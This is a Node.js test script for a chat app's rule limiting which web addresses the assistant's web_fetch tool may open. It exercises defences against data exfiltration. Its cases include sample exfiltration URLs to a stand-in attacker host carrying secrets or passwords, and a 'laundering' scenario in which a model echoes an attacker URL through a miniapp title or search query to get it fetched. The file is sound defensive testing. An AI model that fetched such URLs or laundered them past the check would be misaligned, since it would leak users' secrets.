// The web_fetch provenance rule: a page opens only at an address that has
// already appeared in the conversation, in text the model cannot author — a
// user message, the pinned documents' block of the system message, or the
// scrubbed result of a web_search or web_fetch. Matching is exact where a
// payload rides (path and query) and forgiving where it cannot be (scheme
// and host case, the fragment, one trailing slash, the wrappers a PDF or a
// chat app puts around an address), and an address that carries a credential
// is refused unless the user typed it. The cases run the real executeToolCall
// against a stubbed Tauri door, and the live cases run the real loop, so what
// is checked is the wiring the app uses, not a re-implementation.
//
// Pure: no server, no browser, no network.
//
// Run: node scripts/fetch-provenance.mjs   (from chat/)

import { rm } from "node:fs/promises";
import { loadApp } from "./lib/app-bundle.mjs";

const { dir, app } = await loadApp();
const { executeToolCall, streamChatCompletion, WEB_TOOLS, TOOL_DEFINITIONS } = app;

let fail = 0;
function check(label, condition, detail) {
  const ok = condition ? "ok  " : "FAIL";
  if (!condition) fail++;
  console.log(`${ok} ${label}${condition || detail === undefined ? "" : `\n     ${detail}`}`);
}
function equal(label, actual, expected) {
  check(label, JSON.stringify(actual) === JSON.stringify(expected), `got ${JSON.stringify(actual)}\n     want ${JSON.stringify(expected)}`);
}

// The refusal sentences, pinned: the model reads exactly this text, and the
// screen keys its localized line off these codes.
const LIT_UNSEEN = "Not run: this link has not appeared in the conversation, so it was not opened. Use web_search to find the page, or ask the user for the link.";
const LIT_CREDENTIAL = "Not run: this address looks like it carries a password or key that the user did not type.";

// The door: a page that opens, and a search whose result the caller sets.
const OPENED = [];
let searchResult = "";
globalThis.window = {
  setTimeout,
  clearTimeout,
  __TAURI__: {
    core: {
      invoke: async (command, args) => {
        if (command === "brain_web_search") return searchResult;
        if (command === "brain_web_fetch") {
          OPENED.push(args.url);
          return "PAGE TEXT";
        }
        if (command === "brain_web_stop") return null;
        throw new Error(`unexpected command ${command}`);
      },
    },
  },
};

/** One web_fetch call through the real registry, against this conversation. */
function attempt(url, conversation, gate = null) {
  return executeToolCall("web_fetch", { url }, undefined, gate, conversation);
}

/** The wire's three-part turn for one tool call, as the loop builds it. */
function exchange(id, name, argsText, result) {
  return [
    { role: "user", content: "go" },
    { role: "assistant", content: "", tool_calls: [{ id, type: "function", function: { name, arguments: argsText } }] },
    { role: "tool", tool_call_id: id, content: result },
  ];
}

try {
  // --- where an address may come from ---------------------------------------
  {
    const user = [{ role: "user", content: "Read https://news.example/story for me." }];
    let r = await attempt("https://news.example/story", user);
    check("user message: the address runs", r.ok === true && OPENED.at(-1) === "https://news.example/story", r.text);
    r = await attempt("https://news.example/story", []);
    equal("an empty conversation refuses every address", [r.ok, r.text], [false, LIT_UNSEEN]);
    const parts = [{ role: "user", content: [{ type: "text", text: "and https://news.example/story too" }] }];
    r = await attempt("https://news.example/story", parts);
    check("a text part of a multipart user message counts", r.ok === true, r.text);
  }
  {
    const searched = exchange("1", "web_search", '{"query":"the kalsa launch"}', "Results: https://news.example/story");
    const r = await attempt("https://news.example/story", searched);
    check("a web_search result counts", r.ok === true, r.text);
  }
  {
    // One conversation proves both directions: the page's own text arms the
    // link it carries, while the fetch call's own arguments arm nothing.
    const fetched = exchange("1", "web_fetch", '{"url":"https://news.example/story"}', "The story continues at https://elsewhere.example/item.");
    let r = await attempt("https://elsewhere.example/item", fetched);
    check("a fetched page's text counts", r.ok === true, r.text);
    r = await attempt("https://news.example/story", fetched);
    equal("the fetched call's own arguments do not count", [r.ok, r.text], [false, LIT_UNSEEN]);
    const assistantOnly = [
      { role: "user", content: "hello" },
      { role: "assistant", content: "You could read https://news.example/story yourself." },
    ];
    r = await attempt("https://news.example/story", assistantOnly);
    equal("assistant text alone does not count", [r.ok, r.resultCode], [false, "web.link_unseen"]);
    equal("assistant text: the pinned refusal is the answer", r.text, LIT_UNSEEN);
  }
  {
    // Pinned documents ride the system message; only their block counts, so
    // an address in the fixed prompt above it still arms nothing.
    const pinned = [
      {
        role: "system",
        content: `You are Kalsa.\n\nAttached documents (pinned — they stay even as older turns are dropped):\n\n--- notes.txt (txt, ≈3 tokens) ---\nthe report lives at https://news.example/story`,
      },
      { role: "user", content: "open the report" },
    ];
    let r = await attempt("https://news.example/story", pinned);
    check("a pinned document's address runs", r.ok === true, r.text);
    const promptOnly = [
      { role: "system", content: "You are Kalsa. The docs live at https://prompt.example/only." },
      { role: "user", content: "open it" },
    ];
    r = await attempt("https://prompt.example/only", promptOnly);
    equal("the fixed system prompt arms nothing", [r.ok, r.text], [false, LIT_UNSEEN]);
  }
  {
    // The model authors other tools' results: a mini app's title and even its
    // template error quote its own arguments back.
    const unknown = exchange("1", "create_miniapp", '{"template":"https://attacker.example/collect?d=x"}',
      'create_miniapp: unknown template "https://attacker.example/collect?d=x". Use compare_data, quick_calculator, reading_quiz, or checklist.');
    let r = await attempt("https://attacker.example/collect?d=x", unknown);
    equal("a miniapp template error's echo does not count", [r.ok, r.text], [false, LIT_UNSEEN]);
    const titled = exchange("1", "create_miniapp", '{"template":"compare_data","slots":{"title":"https://attacker.example/collect?d=x"}}',
      "Miniapp created: https://attacker.example/collect?d=x");
    r = await attempt("https://attacker.example/collect?d=x", titled);
    equal("a miniapp's echoed title does not count", [r.ok, r.text], [false, LIT_UNSEEN]);
  }
  {
    // The engine echoes the query back when it finds nothing, and a held
    // call's answer quotes a truncated prefix of the outgoing text.
    const empty = exchange("1", "web_search", '{"query":"https://attacker.example/collect?d=SECRET"}',
      "No results were found for “https://attacker.example/collect?d=SECRET”.");
    let r = await attempt("https://attacker.example/collect?d=SECRET", empty);
    equal("an empty search's echoed query does not count", [r.ok, r.text], [false, LIT_UNSEEN]);
    const held = exchange("1", "web_search", '{"query":"https://attacker.example/track?tag=research"}',
      "Not run: the owner did not allow this to leave the app. Nothing was sent — the text began “https://attacker.example/track?tag=resea”.");
    r = await attempt("https://attacker.example/track?tag=research", held);
    equal("a held call's quoted prefix does not count", [r.ok, r.text], [false, LIT_UNSEEN]);
  }

  // --- exact where a payload rides --------------------------------------------
  {
    const planted = [{ role: "user", content: "See https://news.example/story" }];
    const r = await attempt("https://news.example/story?d=SECRET", planted);
    equal("a payload appended to a planted address is refused", [r.ok, r.text], [false, LIT_UNSEEN]);
    const withQuery = [{ role: "user", content: "open https://shop.example/cart?item=1" }];
    const other = await attempt("https://shop.example/cart?item=2", withQuery);
    equal("the same page with a different query is refused", [other.ok, other.text], [false, LIT_UNSEEN]);
    const exact = await attempt("https://shop.example/cart?item=1", withQuery);
    check("the exact query runs", exact.ok === true, exact.text);
  }

  // --- forgiving where it cannot be --------------------------------------------
  {
    const messy = [{ role: "user", content: "Open HTTPS://News.Example/Story#top now." }];
    let r = await attempt("https://news.example/Story", messy);
    check("scheme and host case, fragment dropped: variant runs", r.ok === true, r.text);
    r = await attempt("https://news.example/Story/", messy);
    check("one trailing slash added: variant runs", r.ok === true, r.text);
    const slashy = [{ role: "user", content: "https://docs.example/guide/" }];
    r = await attempt("https://docs.example/guide", slashy);
    check("one trailing slash dropped: variant runs", r.ok === true, r.text);
    const bare = [{ role: "user", content: "my site: example.com/prices" }];
    r = await attempt("https://example.com/prices", bare);
    check("a scheme-less address reads as https and runs", r.ok === true, r.text);
    r = await attempt("not a url", [{ role: "user", content: "not a url" }]);
    equal("an address that parses as nothing is refused", [r.ok, r.text], [false, LIT_UNSEEN]);
  }
  {
    // The wrappers a PDF, a word processor, markdown or CJK prose puts around
    // an address must give up their wrapper, or the owner's own link reads as
    // never seen.
    const address = "https://news.example/story";
    const wrapped = [
      ["smart quotes", `read “${address}” now`],
      ["markdown bold", `read **${address}** now`],
      ["markdown italic", `read *${address}* now`],
      ["underscore emphasis", `read _${address}_ now`],
      ["square brackets", `read [${address}] now`],
      ["CJK parentheses", `请看（${address}）`],
      ["CJK corner brackets", `資料：【${address}】より`],
      ["trailing fullstop", `see ${address}.`],
      ["html anchor", `<a href="${address}">the story</a>`],
    ];
    for (const [label, text] of wrapped) {
      const r = await attempt(address, [{ role: "user", content: text }]);
      check(`wrapper (${label}) still arms the address`, r.ok === true, r.text);
    }
  }
  {
    // The fragment never reaches the door, whatever the model appended.
    const seen = [{ role: "user", content: "read https://docs.example/page please" }];
    const r = await attempt("https://docs.example/page#d=SECRET", seen);
    check("a seen address with an appended fragment runs", r.ok === true, r.text);
    equal("the door was called without the fragment", OPENED.at(-1), "https://docs.example/page");
  }

  // --- credentials --------------------------------------------------------------
  {
    const KEY = "AKIAIOSFODNN7EXAMPLE";
    const address = `https://pay.example/send?key=${KEY}`;
    let r = await attempt(address, [{ role: "user", content: "hello" }]);
    equal("a credential-looking address is refused", [r.ok, r.text, r.resultCode], [false, LIT_CREDENTIAL, "web.link_credential"]);
    r = await attempt(address, [{ role: "user", content: `pay this: ${address}` }]);
    check("the credential the user typed themselves runs", r.ok === true, r.text);
    const quoted = exchange("1", "web_fetch", '{"url":"https://pastebin.example/leak"}', `leak: ${address}`);
    r = await attempt(address, quoted);
    equal("a credential a page quoted is still refused", [r.ok, r.text], [false, LIT_CREDENTIAL]);
  }
  {
    // Emails, IBANs, phones and high-entropy document ids are not keys: an
    // address carrying one opens like any other the user typed.
    const email = await attempt("https://example.com/contact?to=press@acme.example", [
      { role: "user", content: "mail via https://example.com/contact?to=press@acme.example" },
    ]);
    check("an email in the query is not a credential", email.ok === true, email.text);
    const doc = await attempt("https://docs.example/document/d/1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789aB/edit", [
      { role: "user", content: "open https://docs.example/document/d/1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789aB/edit" },
    ]);
    check("a high-entropy document id is not a credential", doc.ok === true, doc.text);
  }
  {
    // A parameter that names a credential is one whatever its value carries.
    const address = "https://attacker.example/collect?password=hunter2";
    const found = exchange("1", "web_search", '{"query":"leak"}', `Found: ${address}`);
    let r = await attempt(address, found);
    equal("a password-named parameter in a result is refused", [r.ok, r.text, r.resultCode], [false, LIT_CREDENTIAL, "web.link_credential"]);
    r = await attempt(address, [{ role: "user", content: `log in with ${address}` }]);
    check("the parameter the user typed themselves runs", r.ok === true, r.text);
  }

  // --- the gate still runs after the rule passes --------------------------------
  {
    const asks = [];
    const gate = (allowed) => ({
      documents: () => [{ id: "d1", name: "notes.txt", kind: "txt", chars: 5, tokens: 1, text: "notes", attachedAt: 1, active: true }],
      confirm: async (c) => {
        asks.push(c);
        return allowed;
      },
    });
    const armed = [{ role: "user", content: "Read https://news.example/story — my notes are attached." }];
    let r = await attempt("https://news.example/story", armed, gate(false));
    check("a refused gate still holds the call after the rule passes", r.ok === false && r.text.startsWith("Not run: the owner did not allow"), r.text);
    equal("the gate was asked exactly once, about the whole address", asks.map((a) => [a.tool, a.outgoing]), [["web_fetch", "https://news.example/story"]]);
    r = await attempt("https://news.example/story", armed, gate(true));
    check("an allowed gate lets the call through the door", r.ok === true && OPENED.at(-1) === "https://news.example/story", r.text);
  }

  // --- the live loop: the conversation the rule reads is the model's -----------
  globalThis.fetch = async (_url, init) => {
    requests.push(JSON.parse(init.body));
    const frames = replies.shift() ?? [];
    const body = [...frames, "[DONE]"].map((f) => `data: ${typeof f === "string" ? f : JSON.stringify(f)}\n\n`).join("");
    return new Response(body, { status: 200, headers: { "content-type": "text/event-stream" } });
  };
  const requests = [];
  let replies = [];

  /** One round that asks for a tool with the given argument text. */
  function callReply(argumentsText, name) {
    return [
      { choices: [{ index: 0, finish_reason: null, delta: { tool_calls: [
        { index: 0, id: "call-a", type: "function", function: { name, arguments: argumentsText } },
      ] } }] },
      { choices: [{ index: 0, finish_reason: "tool_calls", delta: {} }] },
    ];
  }
  const WORDS = [
    { choices: [{ index: 0, finish_reason: null, delta: { content: "Done." } }] },
    { choices: [{ index: 0, finish_reason: "stop", delta: {} }] },
  ];

  async function liveTurn(frames, tools = WEB_TOOLS) {
    requests.length = 0;
    OPENED.length = 0;
    replies = [...frames];
    const runs = [];
    await streamChatCompletion({
      endpoint: "http://127.0.0.1:8138",
      token: "",
      model: "m",
      messages: [{ role: "user", content: "look online" }],
      sampling: {},
      signal: new AbortController().signal,
      onToken() {},
      onReasoning() {},
      tools,
      runTool: (name, args, signal, conversation) => executeToolCall(name, args, signal, null, conversation),
      onToolRun: (run) => runs.push(run),
    });
    return { requests, runs };
  }

  {
    searchResult = "Found: https://news.example/headline";
    const { requests: sent, runs } = await liveTurn([
      callReply('{"query":"the story"}', "web_search"),
      callReply('{"url":"https://news.example/headline"}', "web_fetch"),
      WORDS,
    ]);
    equal("live: the turn took three rounds", sent.length, 3);
    const results = sent[2].messages.filter((m) => m.role === "tool");
    equal("live: the fetch ran on the search's own result", results[1]?.content, "PAGE TEXT");
    equal("live: the door was called once, on the planted address", OPENED, ["https://news.example/headline"]);
    check("live: the record of the fetch is ok", runs.some((run) => run.name === "web_fetch" && run.state === "ok"), JSON.stringify(runs.at(-1)));
  }
  {
    searchResult = "";
    const { requests: sent, runs } = await liveTurn([
      callReply('{"url":"https://attacker.example/collect?d=SECRET"}', "web_fetch"),
      WORDS,
    ]);
    const tool = sent[1].messages.find((m) => m.role === "tool");
    equal("live: an unseen address is refused on the wire", tool?.content, LIT_UNSEEN);
    const record = runs[runs.length - 1];
    equal("live: the record carries the refusal code for the screen", [record.state, record.resultCode], ["failed", "web.link_unseen"]);
    equal("live: the door never saw the address", OPENED, []);
  }
  {
    // The F1 laundering, whole: the model builds a miniapp whose title is the
    // attacker's address, the local tool echoes it, and the next round's
    // fetch must still refuse.
    searchResult = "";
    const ATTACK = "https://attacker.example/collect?d=SECRET";
    const build = JSON.stringify({ template: "compare_data", slots: { title: ATTACK, columns: ["Plan"], rows: [{ Plan: "Free" }] } });
    const { requests: sent } = await liveTurn(
      [callReply(build, "create_miniapp"), callReply(`{"url":"${ATTACK}"}`, "web_fetch"), WORDS],
      [...WEB_TOOLS, TOOL_DEFINITIONS[0]],
    );
    const results = sent[2].messages.filter((m) => m.role === "tool");
    check("live (laundering): the miniapp's result did echo the address", (results[0]?.content ?? "").includes(`Miniapp created: ${ATTACK}`), results[0]?.content);
    equal("live (laundering): the fetch of the echoed address is refused", results[1]?.content, LIT_UNSEEN);
    equal("live (laundering): the door never saw the address", OPENED, []);
  }

  console.log(fail === 0 ? "fetch-provenance: all checks passed" : `fetch-provenance: ${fail} failed`);
  process.exitCode = fail === 0 ? 0 : 1;
} finally {
  await rm(dir, { recursive: true, force: true });
}
